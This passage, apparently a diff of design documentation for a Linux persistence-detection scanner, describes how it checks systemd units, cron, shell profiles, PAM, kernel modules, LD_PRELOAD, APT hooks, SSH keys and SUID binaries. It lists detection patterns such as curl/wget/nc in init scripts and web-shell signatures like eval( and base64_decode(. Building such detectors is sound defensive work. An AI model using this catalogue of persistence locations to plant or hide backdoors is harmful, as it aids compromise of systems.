-└─────────────────────────────────────────────────────────────────┘
-                              │
-                    Check PKG_CACHE first
-                         │        │
-                     HIT │        │ MISS
-                         ▼        ▼
-                    Return      Continue detection
-                    cached
-                              │
-                ┌─────────────┼─────────────┐
-                │             │             │
-           dpkg -S        rpm -qf      pacman -Qo
-                │
-        ┌───────┴───────┐
-        │               │
-    Package found   Not found
-        │               │
-        ▼               ▼
-   dpkg --verify   → Check snap:
-    (integrity)      /snap/ (any path)  ← covers ~/snap/ user installs
-        │            /var/lib/snapd/
-   ┌────┴────┐
-   │         │
- PASS    FAIL (modified)
-   │         │
- "dpkg:  "dpkg:pkg:
-  pkg"   MODIFIED"
+1. Extract ExecStart= value
+2. Strip systemd modifiers (@, -, +, !, :)
+3. Pre-check: grep COMBINED_NEVER_WHITELIST_PATTERN on raw ExecStart line
+   → Match found before package check → flag HIGH (bypass prevention)
+4. get_executable_from_command() → extracts binary/script path
 
-                    → Check flatpak:
-                      /var/lib/flatpak/
-                      ~/.local/share/flatpak/
-
-                    → Check runtime-managed:
-                      /node_modules/         ← npm packages
-                      /site-packages/        ← Python pip packages
-                      /dist-packages/        ← Python system packages
-                      /.cargo/registry/      ← Rust crates (installed)
-                      /.cargo/bin/           ← Rust binaries
-                      /go/pkg/mod/           ← Go modules
-                      /gems/gems/            ← Ruby gems
-
-                    → Not matched → "unmanaged"
+   ┌─── Is executable an interpreter? ───────────────────────────────┐
+   │ (python*, perl*, ruby*, bash, sh, dash, zsh, ksh*, php*, node,  │
+   │  nodejs, java, lua*, awk, gawk, mawk, env)                       │
+   └─────────────────────────────────────────────────────────────────┘
+            YES                              NO
+             │                               │
+   ┌─────────▼──────────┐         ┌──────────▼──────────┐
+   │ Check interpreter  │         │ Check binary pkg     │
+   │ binary itself      │         │ MODIFIED → CRITICAL  │
+   │ MODIFIED → CRITICAL│         │ UNMANAGED → analyze  │
+   └─────────┬──────────┘         └──────────┬──────────┘
+             │                               │
+   Has script arg?                   Binary in known-good path?
+      YES         NO                      YES      NO
+       │           │                      │         │
+   get_script   analyze              LOW/skip   analyze
+   from args   inline_code()               location + content
+       │
+   Check script package status
+     MODIFIED → CRITICAL
+     VERIFIED + NEVER_WHITELIST → HIGH (bypass prevention)
+     VERIFIED, no patterns → LOW, done
+     UNMANAGED → analyze_script_content()
+                   → patterns found: HIGH
+                   → no patterns, suspicious location: MEDIUM→HIGH
+                   → no patterns, standard path: MEDIUM
 ```
 
-### adjust_confidence_for_package()
+### ExecStartPre/Post Hook Analysis
 
-| Package Status | HIGH input | MEDIUM input | LOW input |
-|---------------|------------|--------------|-----------|
-| `dpkg:pkg:MODIFIED` | CRITICAL | CRITICAL | CRITICAL |
-| `verified` (dpkg/rpm/pacman) | MEDIUM | LOW | LOW |
-| `snap:pkg` | MEDIUM | LOW | LOW |
-| `flatpak:pkg` | MEDIUM | LOW | LOW |
-| `runtime-managed` | MEDIUM | LOW | LOW |
-| `unmanaged` | HIGH | MEDIUM | LOW |
+Each hook command is extracted from semicolon-delimited list. For each:
+1. Strip systemd modifiers
+2. `get_executable_from_command()` → executable path
+3. `is_package_managed()` → MODIFIED: CRITICAL (`modified_exec_hook`) / UNMANAGED: HIGH (`unmanaged_exec_hook`)
+4. Pattern check on full hook string → `suspicious_exec_hook`
+
+### OnFailure= Analysis
+
+Each unit name in `OnFailure=` is resolved to a service file path. The service file is verified:
+- Unmanaged → HIGH
+- Modified → CRITICAL
+
+### Environment= / EnvironmentFile= Analysis
+
+`Environment=`: grep for `LD_PRELOAD`, `LD_LIBRARY_PATH`, `PATH` in inline values → `env_directive_ld_inject` at HIGH.
+
+`EnvironmentFile=`: strip leading `-` (optional marker), resolve path:
+- File exists + unmanaged + LD_PRELOAD inside → `env_file_ld_inject` at HIGH
+- File exists + MODIFIED → `modified_env_file` at CRITICAL
+- File missing → `missing_env_file` at MEDIUM
+
+### Systemd Timer Content
+
+For `.timer` files associated with services already flagged:
+- `OnBootSec=`, `OnCalendar=`, `OnUnitActiveSec=` values logged in finding description
+- `Unit=` cross-checked — if timer activates a non-corresponding service name, flagged HIGH
+
+### Generator Detection
+
+Each binary in generator directories:
+- `check_file_package()` → MODIFIED: CRITICAL (`modified_generator`)
+- UNMANAGED in suspicious location → CRITICAL (`suspicious_location_generator`)
+- UNMANAGED in standard location → MEDIUM→HIGH (`unmanaged_generator`)
 
 ---
 
-## Module 3: Shell Profiles Detection (v2.2.0)
+## Module 2: Cron Jobs & Scheduled Tasks
 
-```
-SCAN LOCATIONS:
-├── System profiles: /etc/profile, /etc/bash.bashrc, /etc/zsh/zshrc,
-│     /etc/profile.d/*.sh, /etc/fish/config.fish
-├── User profiles: ~/.bashrc, ~/.bash_profile, ~/.profile, ~/.zshrc,
-│     ~/.config/fish/config.fish  (for each user in /etc/passwd)
-└── Global XDG: /etc/environment, /etc/xdg/autostart
+**Function:** `check_cron()` | **Label:** `[2/14] Cron Jobs`
 
-For each profile:
-  1. Check package status → is_package_managed()
-     │
-     ├── verified  → LOW
-     ├── modified  → CRITICAL
-     └── unmanaged → analyze content:
+### Scan Paths and Parsing
 
-  2. Parse for sourced files / exec commands
-     └── For each extracted command:
-           → quick_suspicious_check()
-           → analyze_inline_code() if -c/-e flag
-           → analyze_script_content() if script path
+**`/etc/crontab`** and **`/etc/cron.d/*`**: Each non-comment line with 7+ fields: `min hr dom mon dow user command`. Command starts at field 7. `@special` syntax: field 1=`@reboot` etc., field 2=user, field 3+=command.
 
-  3. Time-based elevation (ALL 4 loops):
-     │  mod_time extracted from metadata
-     │  days_old < 7 AND confidence == MEDIUM
-     └→ confidence = HIGH
+**`/etc/cron.daily`, `.hourly`, `.weekly`, `.monthly`**: Each file is a script — no schedule fields. Analyzed as scripts, not crontab lines.
 
-  4. add_finding() with package_status in metadata
-```
+**`/var/spool/cron/` and `/var/spool/cron/crontabs/`**: Per-user crontabs. Format: no user field (5-field schedule + command).
+
+**`/etc/anacrontab`**: `period delay job-id command`. Package status checked.
+
+**`/var/spool/at/`**: Each file is an AT job. Hidden filenames (starting with `.`) flagged HIGH.
+
+**`/etc/at.allow`, `/etc/at.deny`, `/etc/cron.allow`, `/etc/cron.deny`**: Each user listed cross-referenced against `/etc/passwd` — nonexistent users flagged MEDIUM (may indicate a deleted account left an access grant).
+
+### Command Analysis (`analyze_cron_command()`)
+
+1. NEVER_WHITELIST patterns checked first → HIGH
+2. SUSPICIOUS_COMMANDS → HIGH
+3. `SUSPICIOUS_NETWORK_PATTERNS` → HIGH
+4. If command executes a file: `is_package_managed()` on the target → MODIFIED: CRITICAL, UNMANAGED: HIGH
 
 ---
 
-## Module 2: Cron Detection Logic
+## Module 3: Shell Profiles & RC Files
 
-```
-┌─────────────────────────────────────────────────────────────────┐
-│                     CRON ANALYSIS FLOW                          │
-└─────────────────────────────────────────────────────────────────┘
+**Function:** `check_shell_profiles()` | **Label:** `[3/14] Shell Profiles`
 
-SCAN LOCATIONS:
-├── /etc/crontab           # System crontab
-├── /etc/cron.d/*          # System cron jobs
-├── /etc/cron.daily/*      # Daily scripts
-├── /etc/cron.hourly/*     # Hourly scripts
-├── /etc/cron.weekly/*     # Weekly scripts
-├── /etc/cron.monthly/*    # Monthly scripts
-├── /var/spool/cron/*      # User crontabs
-└── at jobs (atq)          # Scheduled one-time jobs
+### Scan Strategy
 
-For each cron file/entry:
-                              │
-                              ▼
-              ┌───────────────────────────────┐
-              │ Check for suspicious content: │
-              │ UNIFIED_SUSPICIOUS_PATTERN    │
-              │ (derived from all arrays)     │
-              └───────────────────────────────┘
-                              │
-                              ▼
-              ┌───────────────────────────────┐
-              │ Check modification age:       │
-              │ < 7 days + MEDIUM → HIGH      │
-              └───────────────────────────────┘
-                              │
-                              ▼
-              ┌───────────────────────────────┐
-              │ If cron is a script:          │
-              │ → run analyze_script_content  │
-              │ → check for interpreters      │
-              └───────────────────────────────┘
-                              │
-                              ▼
-              ┌───────────────────────────────┐
-              │ Adjust for package management │
-              │ Package-managed → Lower conf  │
-              └───────────────────────────────┘
-```
+System profiles always scanned. Per-user profiles scanned when running as root — reads `/etc/passwd` to enumerate all home directories with UID >= 1000 (plus UID 0 for root's own files).
+
+### Analysis per File
+
+1. `quick_suspicious_check()` on first 500 lines — fast exit if clean
+2. If passes: `analyze_script_content()` on full first 500 lines
+3. `is_package_managed()` on the file itself
+4. `adjust_confidence_for_package()` applied
+5. Mtime check: modified within 7 days escalates one tier
+
+Special cases: `.zshenv` is flagged as higher-impact in descriptions because it sources for ALL zsh invocations, including non-interactive scripts.
 
 ---
 
-## Modules 4-7: Other Detection Modules
+## Module 4: Init Scripts & RC.local
 
-### Init Scripts (Module 4)
-```
-SCAN: /etc/rc.local, /etc/init.d/*, /etc/rc*.d/*
-CHECK: Suspicious commands in startup scripts via UNIFIED pattern
-CONFIDENCE: curl/wget/nc in init → HIGH
-```
+**Function:** `check_init_scripts()` | **Label:** `[4/14] Init Scripts`
 
----
+### Analysis Flow
 
-### Kernel/Preload (Module 5) — v2.2.0
+**rc.local files**: If exists and non-empty → `is_package_managed()` + `analyze_script_content()` on full content.
 
-Module 5 covers six distinct kernel/preload subsystems. Each has its own
-integrity and content analysis flow.
+**`/etc/init.d/` files**: `is_package_managed()` first. VERIFIED with no patterns → LOW. MODIFIED → CRITICAL. UNMANAGED → analyze content.
 
-```
-┌─────────────────────────────────────────────────────────────────┐
-│              KERNEL/PRELOAD DETECTION (v2.2.0)                  │
-├─────────────────────────────────────────────────────────────────┤
-│  TYPE 1: /etc/ld.so.preload        → library integrity          │
-│  TYPE 2: /etc/ld.so.conf[.d]       → conf integrity + .so scan  │
-│  TYPE 3: /etc/environment          → LD_PRELOAD lib verification │
-│  TYPE 4: /etc/modules-load.d       → .ko file verification      │
-│  TYPE 5: /etc/modprobe.d           → install/blacklist analysis  │
-│  TYPE 6: lsmod                     → loaded module enumeration   │
-└─────────────────────────────────────────────────────────────────┘
-```
+**`/etc/rc*.d/`**: Two separate checks per entry:
 
-#### TYPE 1: /etc/ld.so.preload
-```
-If /etc/ld.so.preload exists and is non-empty:
-  → add_finding HIGH (ld_so_preload_present)
+1. **Regular files**: Any non-symlink file in rc*.d is flagged HIGH (`non_symlink_in_rcd`) — these directories should only contain symlinks.
 
-For each library path listed in the file:
-  → is_package_managed(lib_path)
-     ├── verified  → LOW  (unusual but legitimate)
-     ├── modified  → CRITICAL (modified_ld_preload_lib)
-     └── unmanaged → HIGH  (unmanaged_ld_preload_lib)
-```
-
-#### TYPE 2: /etc/ld.so.conf + /etc/ld.so.conf.d/*
-```
-Step A — Config file integrity:
-  For each conf file:
-  → is_package_managed(conf_file)
-     ├── verified  → skip
-     ├── modified  → CRITICAL (modified_ld_conf)
-     └── unmanaged → MEDIUM  (unmanaged_ld_conf)
-
-Step B — Non-standard path .so scan:
-  Extract all directory paths listed in conf files.
-  Exclude standard system dirs:
-    /usr/lib, /usr/lib64, /lib, /lib64
-  For each remaining (non-standard) path:
-    find *.so files within it
-    For each .so file:
-    → is_package_managed(so_file)
-       ├── verified  → skip
-       ├── modified  → CRITICAL (modified_nonstandard_so)
-       └── unmanaged → HIGH    (unmanaged_nonstandard_so)
-```
-
-#### TYPE 3: /etc/environment — LD_PRELOAD/LD_LIBRARY_PATH Library Verification
-```
-If /etc/environment contains LD_PRELOAD or LD_LIBRARY_PATH:
-  → add_finding HIGH on the env file itself (env_ld_preload_set)
-
-For each absolute path value extracted:
-  → is_package_managed(lib_path)
-     ├── verified  → LOW  (env_ld_preload_verified)
-     ├── modified  → CRITICAL (env_ld_preload_modified)
-     └── unmanaged → CRITICAL (env_ld_preload_unmanaged)
-
-Note: The env file finding and the library finding are separate.
-An attacker-installed library is CRITICAL regardless of whether
-the env file itself looks suspicious.
-```
-
-#### TYPE 4: /etc/modules + /etc/modules-load.d/* — .ko File Verification
-```
-Step A — Config file integrity:
-  For each config file:
-  → is_package_managed(config_file)
-     ├── verified  → skip (skip ko verification too)
-     ├── modified  → CRITICAL (modified_module_config) + run ko verification
-     └── unmanaged → MEDIUM  (unmanaged_module_config) + run ko verification
-
-Step B — .ko file verification (per unique module name):
-  Extract module names (non-comment, non-blank lines)
-  For each module name:
-    modinfo -F filename <name> → resolve to .ko path
-    ├── empty or "(builtin)" → skip
-    ├── .ko path outside /lib/modules/ or /usr/lib/modules/
-    │     → HIGH (module_ko_unexpected_location)
-    └── .ko path within standard location:
-          → is_package_managed(ko_path)
-             ├── verified  → skip
-             ├── modified  → CRITICAL (modified_module_ko)
-             └── unmanaged → MEDIUM  (unmanaged_module_ko)
-    Module name not resolved by modinfo at all → MEDIUM (module_missing_ko)
-```
-
-#### TYPE 5: /etc/modprobe.d/ + /etc/modprobe.conf — Install/Blacklist Analysis
-```
-Step A — Config file integrity:
-  Collect: /etc/modprobe.conf + all files in /etc/modprobe.d/
-  For each config file:
-  → is_package_managed(config_file)
-     ├── verified  → MEDIUM baseline (modprobe_config)
-     ├── modified  → CRITICAL (modified_modprobe_config)
-     └── unmanaged → MEDIUM  (unmanaged_modprobe_config)
-
-Step B — install directive analysis:
-  Extract: lines matching "^install <module> <command>"
-  For each install command target:
-    ├── Bash builtin or ":" → skip (legitimate no-op to block loading)
-    ├── Not an absolute path → skip
-    ├── Absolute path not on disk → CRITICAL (modprobe_install_missing_cmd)
-    ├── Path in suspicious location (/tmp, /dev/shm, hidden dir)
-    │     → CRITICAL (modprobe_install_suspicious_location)
-    └── Absolute path exists:
-          → is_package_managed(cmd_path)
-             ├── verified  → MEDIUM (modprobe_install_verified_cmd)
-             ├── modified  → CRITICAL (modprobe_install_modified_cmd)
-             └── unmanaged → HIGH   (modprobe_install_unmanaged_cmd)
-
-Step C — security module blacklist detection:
-  Extract: lines matching "^blacklist <module>"
-  If module name is one of: apparmor, selinux, seccomp, lockdown
-    → HIGH (modprobe_security_blacklist)
-    Note: blacklisting these silences kernel security enforcement
-```
-
-#### TYPE 6: lsmod — Loaded Module Enumeration
-```
-Run lsmod → enumerate all currently-loaded kernel modules
-For each module:
-  modinfo -F filename <name> → resolve to .ko path
-  → is_package_managed(ko_path)
-     ├── verified  → LOW (expected)
-     ├── modified  → CRITICAL (modified_loaded_module)
-     └── unmanaged → HIGH    (unmanaged_loaded_module)
-```
+2. **Symlinks**: `readlink -f` to get canonical target.
+   - Target doesn't exist → MEDIUM (`broken_rcd_symlink`)
+   - Target exists but is NOT under `/etc/init.d/` → HIGH (`suspicious_rcd_symlink`) + analyze target content if it's a file
+   - Target is in `/tmp/`, `/dev/shm/`, `/var/tmp/` → CRITICAL (`suspicious_rcd_symlink_temp`)
 
 ---
 
-### Additional Persistence (Module 6) — v2.2.0
+## Module 5: Kernel Modules & Library Preloading
 
-#### XDG Autostart
-```
-SCAN: /etc/xdg/autostart/*.desktop
-      + ~/.config/autostart/*.desktop for all users in /etc/passwd (root only)
-CHECK: Exec= line analyzed via quick_suspicious_check() + analyze_script_content()
-CONFIDENCE: Suspicious Exec= → HIGH; recently modified + MEDIUM → HIGH
-```
+**Function:** `check_kernel_and_preload()` | **Label:** `[5/14] Kernel/Preload`
 
-#### /etc/environment
-```
-See Kernel/Preload Module 5 TYPE 3 above for library verification.
-The env file itself is scanned for LD_PRELOAD/LD_LIBRARY_PATH presence.
-```
+### `/etc/ld.so.preload`
 
-#### Sudoers
-```
-SCAN: /etc/sudoers, /etc/sudoers.d/*
-CHECK:
-  1. is_package_managed() — modified → CRITICAL
-  2. Content analysis:
-     → grep for NOPASSWD or .*ALL.*=.*ALL patterns
-       If found: confidence escalated to HIGH
-CONFIDENCE: NOPASSWD or broad ALL grant → HIGH
-```
+Each non-comment line is a library path. For each:
+1. Check location against `SUSPICIOUS_LOCATIONS` → CRITICAL if temp/hidden
+2. `is_package_managed()` → VERIFIED: MEDIUM, MODIFIED: CRITICAL, UNMANAGED: HIGH
+3. File existence check — missing library flagged at same confidence
 
-#### PAM (Pluggable Authentication Modules) — v2.2.0
+### `/etc/ld.so.conf` and `/etc/ld.so.conf.d/`
 
-```
-┌─────────────────────────────────────────────────────────────────┐
-│                  PAM DETECTION (v2.2.0)                         │
-├─────────────────────────────────────────────────────────────────┤
-│  Step 1: Build _all_pam_files (file collection)                 │
-│  Step 2: Config file integrity check                            │
-│  Step 3: Module .so integrity (named + absolute-path refs)      │
-│  Step 4: pam_exec.so relay detection                            │
-│  Step 5: pam_python/pam_perl relay detection                    │
-│  Step 6: pam_script.so hook detection                           │
-│  Step 7: pam_env.conf LD_PRELOAD                                │
-│  Step 8: ~/.pam_environment LD_PRELOAD (root only)              │
-│  Step 9: /etc/security/ general scan                            │
-└─────────────────────────────────────────────────────────────────┘
-```
+1. `is_package_managed()` on the conf file → MODIFIED: CRITICAL, UNMANAGED: HIGH
+2. Parse non-comment, non-include lines as library search paths
+3. For unmanaged configs: grep paths for suspicious locations
+4. Collect non-standard paths (not `/usr/lib*`, `/lib*`, `/usr/lib64`, `/lib64`)
+5. For each non-standard path: scan all `.so*` files → `is_package_managed()` on each
 
-**Step 1 — File Collection**
-```
-_all_pam_files = []
-Add all files in /etc/pam.d/
-Add /etc/pam.conf if it exists
-For each file: extract @include directives
-  → target outside /etc/pam.d/ → add to _all_pam_files (deduped)
-Build _pam_cfg_content = concatenated content of all _all_pam_files
-  (/etc/pam.conf lines stripped of leading service-name column)
-```
+### Loaded Kernel Modules (`lsmod`)
 
-**Step 2 — Config File Integrity**
-```
-For each file in _all_pam_files:
-  → is_package_managed(pam_cfg_file)
-     ├── verified  → skip (continue)
-     ├── modified  → CRITICAL (pam_config_modified)
-     └── unmanaged → skip   (pam-auth-update files not tracked by dpkg)
-```
+1. Parse module name from lsmod output
+2. `modinfo -F filename "$module"` → get `.ko` file path
+3. If modinfo returns no filename → built-in module, skip
+4. If `.ko` path:
+   - In `/lib/modules/` or `/usr/lib/modules/` → standard location
+   - In other path → `module_nonstandard_location` HIGH
+   - In temp path → `module_suspicious_location` CRITICAL
+   - `is_package_managed()` on `.ko` path → MODIFIED: CRITICAL, UNMANAGED in standard: HIGH
 
-**Step 3 — Module .so Integrity**
-```
-Extract named modules (e.g., pam_unix.so) from _pam_cfg_content
-  → resolve to full path via /lib/security/, /lib/*/security/, etc.
-Extract absolute-path .so references (e.g., /opt/custom/pam_evil.so)
-  → use path directly
+### `/etc/modprobe.d/` Config Files
 
-For each unique resolved path (deduped by full path):
-  → is_package_managed(module_path)
-     ├── verified  → skip
-     ├── modified  → CRITICAL (modified_pam_module)
-     └── unmanaged → HIGH    (unmanaged_pam_module)
-```
+1. `is_package_managed()` on each `.conf` file → MODIFIED: CRITICAL, UNMANAGED: MEDIUM
+2. Content check for `install` directives with suspicious command targets
+3. Content check for `blacklist` of security modules (apparmor, selinux, seccomp) → HIGH
 
-**Step 4 — pam_exec.so Relay Detection**
-```
-Extract pam_exec.so lines from _pam_cfg_content
-Regex handles all argument forms:
-  pam_exec.so /path/to/script
-  pam_exec.so expose_authtok /path/to/script      (bare flag)
-  pam_exec.so log=/var/log/pam.log /path/to/script (key=value)
-  pam_exec.so --quiet /path/to/script              (double-dash flag)
+### `/etc/modules` and `/etc/modules-load.d/`
 
-For extracted exec_script path:
-  → is_package_managed(exec_script)
-     ├── verified  → LOW
-     ├── modified  → CRITICAL (pam_exec_modified_script)
-     └── unmanaged:
-          ├── script does not exist on disk
-          │     → CRITICAL (pam_exec_missing_script)
-          │       [post-compromise cleanup indicator]
-          ├── script in /tmp, /dev/shm, /run/user/, or hidden dir
-          │     → CRITICAL (pam_exec_suspicious_location)
-          ├── analyze_script_content() returns suspicious
-          │     → CRITICAL (matched pattern from analysis)
-          └── clean unmanaged script
-                → HIGH (pam_exec_unmanaged_script)
-```
-
-**Step 5 — pam_python / pam_perl Relay Detection**
-```
-For each relay module in [pam_python, pam_perl]:
-  Extract script path argument from _pam_cfg_content
-  Apply same verification flow as pam_exec (Step 4):
-    missing → CRITICAL, suspicious location/content → CRITICAL
-    clean unmanaged → CRITICAL (relay modules have no legitimate use case)
-  add_finding identifies which relay module triggered the finding
-```
-
-**Step 6 — pam_script.so Hook Detection**
-```
-If pam_script.so is referenced in _pam_cfg_content:
-  Scan known hook paths in /etc/security/:
-    pam_script_auth, pam_script_acct, pam_script_passwd, pam_script_ses
-  For each hook file that exists:
-    → is_package_managed(hook_file)
-       ├── modified  → CRITICAL (pam_script_hook_modified)
-       ├── unmanaged:
-       │     analyze_script_content(hook_file)
-       │     ├── suspicious → CRITICAL (pam_script_hook)
-       │     └── clean      → HIGH    (pam_script_hook)
-       └── verified  → LOW
-```
-
-**Step 7 — pam_env.conf LD_PRELOAD**
-```
-If /etc/security/pam_env.conf contains LD_PRELOAD= or DEFAULT=*:
-  Extract absolute path value
-  → is_package_managed(lib_path)
-     ├── verified  → LOW
-     ├── modified  → CRITICAL (pam_env_conf_ld_preload_modified)
-     └── unmanaged → CRITICAL (pam_env_conf_ld_preload_unmanaged)
-```
-
-**Step 8 — ~/.pam_environment LD_PRELOAD (root only)**
-```
-For each user home in /etc/passwd:
-  If ~/.pam_environment exists:
-    Scan for LD_PRELOAD entries
-    For each extracted library path:
-    → is_package_managed(lib_path)
-       ├── verified  → LOW
-       └── unmanaged/modified → CRITICAL (pam_environment_ld_preload)
-```
-
-**Step 9 — /etc/security/ General Scan**
-```
-For each file in /etc/security/:
-  → is_package_managed(file)
-     ├── verified  → skip
-     ├── modified  → CRITICAL (modified_security_config)
-     └── unmanaged:
-           if file is executable AND analyze_script_content() suspicious
-             → HIGH (suspicious_security_script)
-           else → skip
-```
+Each module name listed is resolved via `modinfo` and verified. Config file integrity checked.
 
 ---
 
-### MOTD Scripts (Module 7 — partial)
-```
-SCAN: /etc/update-motd.d/*
-FLOW:
-  1. is_package_managed(motd_file) FIRST
-     ├── modified  → CRITICAL (modified_motd_script)
-     └── unmanaged → analyze_script_content()
-  2. analyze_script_content() on unmanaged scripts
-     → suspicious → HIGH
-CONFIDENCE: Modified package MOTD → CRITICAL; unmanaged suspicious → HIGH
-```
+## Module 6: Additional Persistence Mechanisms
 
-### Backdoor Locations (Module 7)
+**Function:** `check_additional_persistence()` | **Label:** `[6/14] Additional`
+
+### CHECK 1 — XDG Autostart
+
+For each `.desktop` file: extract `Exec=` field → `get_executable_from_command()` → analyze executable and any script argument. Same interpreter/direct-binary analysis flow as Module 1.
+
+### CHECK 2 — /etc/environment LD_PRELOAD
+
+Parse each line for `LD_PRELOAD=` or `LD_LIBRARY_PATH=`. For each library path found:
+1. Flag file as HIGH (`ld_preload_env`)
+2. `is_package_managed()` on the library → MODIFIED: CRITICAL, UNMANAGED: HIGH, missing: CRITICAL
+
+### CHECK 3 — Sudoers
+
+For each file in `/etc/sudoers` and `/etc/sudoers.d/`:
+1. `visudo -c -f` syntax check where available
+2. Grep for `NOPASSWD`, `ALL=(ALL) ALL`, `(ALL:ALL)` patterns → HIGH (`dangerous_sudoers_rule`)
+3. `is_package_managed()` on file → MODIFIED: CRITICAL
+
+### CHECK 4 — PAM Modules and Configuration
+
+**PAM config parsing**: For each file in `/etc/pam.d/`:
+1. Extract module names (lines matching `pam_*.so`)
+2. Locate `.so` file in PAM library directories
+3. `is_package_managed()` on `.so` file → UNMANAGED: CRITICAL, MODIFIED: CRITICAL
+
+**pam_exec.so detection**: When `pam_exec.so` found in a PAM config:
+1. Extract the script path from arguments
+2. If script missing → CRITICAL (`pam_exec_missing_script`)
+3. If script in temp dir → CRITICAL (`pam_exec_suspicious_location`)
+4. `is_package_managed()` on script → MODIFIED: CRITICAL, UNMANAGED: `pam_exec_script`
+5. `analyze_script_content()` on script content
+
+**pam_env.so detection**: When `pam_env.so` found:
+1. Read `/etc/security/pam_env.conf` for `LD_PRELOAD` or `LD_LIBRARY_PATH`
+2. If found: extract library path, `is_package_managed()` → HIGH or MEDIUM
+
+**pam_python.so / pam_perl.so / pam_script.so relay detection**: Extract script path argument, analyze content via `analyze_script_content()`.
+
+**pam_env.conf per-user**: Scan `~/.pam_environment` for all users — same LD_PRELOAD detection.
+
+**PAM config integrity**: `is_package_managed()` on each `/etc/pam.d/` file → MODIFIED: CRITICAL.
+
+### CHECK 5 — MOTD Scripts
+
+For each file in `/etc/update-motd.d/` and `/etc/motd.d/`:
+1. `is_package_managed()` → MODIFIED: CRITICAL, UNMANAGED: MEDIUM
+2. `analyze_script_content()` → HIGH/CRITICAL if patterns found
+
+### CHECK 6 — Duplicate UID 0 Accounts
+
+Parse `/etc/passwd`, check field 3 (UID). Any account with UID=0 where username is not `root` → CRITICAL finding.
+
+### CHECK 7 — Shell Masking via Trailing Whitespace
+
+Parse `/etc/passwd` field 7 (shell). For each entry:
+1. Check if shell field ends with whitespace before EOL — HIGH (`shell_masking`)
+2. Check if shell is not in `/etc/shells` and not `nologin`/`false`/`sync` — MEDIUM
+
+---
+
+## Module 7: Package Manager Backdoors & Common Locations
+
+**Function:** `check_common_backdoors()` | **Label:** `[7/14] Backdoor Locations`
+
+### CHECK 1 — APT/YUM Configuration Files
+
+Enumerate files in `/etc/apt/apt.conf.d/`, `/usr/share/unattended-upgrades/`, `/etc/yum.repos.d/`, `/etc/yum.conf`. Run `check_suspicious_patterns()` on content. Flag on match.
+
+### CHECK 2 — APT Hook Directives
+
+Re-scan APT conf files specifically for `DPkg::Post-Invoke`, `DPkg::Pre-Invoke`, `APT::Update::Pre-Invoke`, `APT::Update::Post-Invoke` via `grep -iE`. For each match:
+1. `check_file_package()` → `PKG_STATUS` (UNMANAGED → HIGH, MODIFIED → CRITICAL)
+2. Extract hook command string: `grep -oiE '"[^"]+"[[:space:]]*;'` — content between first pair of quotes
+3. `analyze_script_content()` on extracted command → CRITICAL if patterns found
+
+### CHECK 3 — YUM/DNF Plugin Configurations
+
+Enumerate plugin config files. Read `.py` script bodies. `analyze_script_content()` on each.
+
+### CHECK 4 — DPKG Postinst Scripts
+
+Bulk query: `timeout 10 dpkg-query -W -f='${Package}\t${Status}\n'` → builds `_dpkg_installed_pkgs` associative array (package → installed boolean).
+
+For each `.postinst` file in `/var/lib/dpkg/info/`:
+1. Extract package name from filename (strip `.postinst`)
+2. Lookup in `_dpkg_installed_pkgs` — if NOT present: orphan (uninstalled package's postinst) → HIGH
+3. `analyze_script_content()` on file content
+4. Hex/octal obfuscation check: grep for `\x[0-9a-f]{2}` or `\0[0-7]{3}` sequences → HIGH
+
+### RPM Scripts (Between CHECK 4 and CHECK 5)
+
+`timeout 30 rpm -qa --scripts` → full list of all package scripts. Each script body analyzed via `analyze_script_content()`.
+
+### CHECK 5 — at.allow / at.deny
+
+For each user in `/etc/at.allow` and `/etc/at.deny`: cross-reference against `/etc/passwd`. User not found → MEDIUM (ghost access grant).
+
+### CHECK 6 — doas.conf
+
+Read `/etc/doas.conf`. Grep for `nopass` (passwordless), `permit` without `as` qualifier, or wildcard identity. → HIGH (`permissive_doas`).
+
+### CHECK 7 — Git Configs (Credential Helpers and Hooks)
+
+For each git config (`/etc/gitconfig`, per-user `~/.gitconfig`):
+1. `[credential] helper = <command>` — extract helper command, check if it's an unmanaged path or matches suspicious patterns → MEDIUM/HIGH
+2. `[core] pager = <command>` — check for suspicious commands → MEDIUM/HIGH
+
+### CHECK 8 — Web Shell Scan
+
+Five web directories: `/var/www/html/`, `/var/www/`, `/usr/share/nginx/html/`, `/srv/http/`, `/srv/www/`. For each, `find "$dir" -xdev -type f \( -name "*.php" -o -name "*.asp" -o -name "*.aspx" -o -name "*.jsp" \)`.
+
+For each matched web file: grep for web shell signatures:
+- PHP: `system(`, `exec(`, `passthru(`, `shell_exec(`, `popen(`, `_POST[`, `_GET[`, `eval(`, `base64_decode(`
+- Generic: `<?php`, request/response output patterns
+
+Positive match → HIGH (`webshell_pattern`).
+
+---
+
+## Module 8: SSH Persistence
+
+**Function:** `check_ssh_persistence()` | **Label:** `[8/14] SSH`
+
+### Regular Users (UID >= 1000)
+
+For each user home with readable `.ssh/authorized_keys`:
+1. Check mtime: modified within 7 days → MEDIUM baseline
+2. For each key line: extract `command="..."` option via regex `command="([^"\\]|\\.){0,200}"`
+3. `analyze_script_content()` on extracted command → HIGH/CRITICAL
+
+For each `~/.ssh/rc`: presence → MEDIUM, content analysis → HIGH/CRITICAL.
+
+### System Accounts (UID 1-999)
+
+Parse `/etc/passwd` for entries with UID 1-999. For each with a readable home:
+1. Check `$homedir/.ssh/authorized_keys` existence → HIGH (`system_account_ssh_key`)
+2. Extract `command=` options → `analyze_script_content()` → CRITICAL if malicious
+
+---
+
+## Module 9: Binary Integrity
+
+**Function:** `check_binary_integrity()` | **Label:** `[9/14] Binary Integrity`
+
+### Package Integrity Verification
+
+**Debian/Ubuntu (dpkg)**:
+1. For each binary in `/usr/bin`, `/usr/sbin`, `/bin`, `/sbin`: `dpkg -S "$file"` to find owning package
+2. Batch `dpkg --verify "$package"` — parse output for modified files
+3. Skip lines with ` c ` (conffiles — expected to be user-modified)
+4. Modified binary in critical path → CRITICAL (`modified_binary`)
+
+PAM modules in architecture-specific security dirs also verified via `dpkg --verify`.
+
+**RHEL/CentOS (rpm)**: `rpm -qf "$file"` to find owning package, `rpm -Va "$package"` to verify.
+
+### SUID/SGID Active Scan
+
+`find` with `-perm /4000` (SUID) and `-perm /2000` (SGID) across: `/usr/bin`, `/usr/sbin`, `/bin`, `/sbin`, `/usr/local/bin`, `/usr/local/sbin`, `/opt`, `/tmp`, `/dev/shm`, `/var/tmp`.
+
+Result cap: 200 SUID, 100 SGID.
+
+For each SUID file:
+1. `check_file_package()` → if unmanaged: CRITICAL (`suid_unmanaged_binary`)
+2. Location check: temp dirs → CRITICAL (`suid_suspicious_location`)
+3. Script check (shebang): if shell script → `analyze_script_content()` → CRITICAL (`suid_script_malicious_content`)
+4. Package-verified SUID → LOW (`suid_binary`)
